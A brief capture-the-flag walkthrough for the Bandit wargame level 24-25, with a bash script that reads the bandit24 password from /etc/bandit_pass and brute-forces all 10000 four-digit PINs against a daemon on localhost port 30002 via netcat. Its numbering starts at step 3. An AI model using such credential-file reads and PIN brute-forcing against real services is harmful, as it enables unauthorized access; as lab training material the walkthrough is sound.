Level 24-25


task:- A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.You do not need to create new connections each time

step3 - ls -la
step4 - mkdir /tmp/parth25
step5 - cd /tmp/parth25
step6 - nano brute.sh
#!/bin/bash
pass=$(cat /etc/bandit_pass/bandit24)

for pin in $(seq -w 0000 9999); do
    echo "$pass $pin"
done | nc localhost 30002
step7 - chmod +x brute.sh
step8 - ./brute.sh

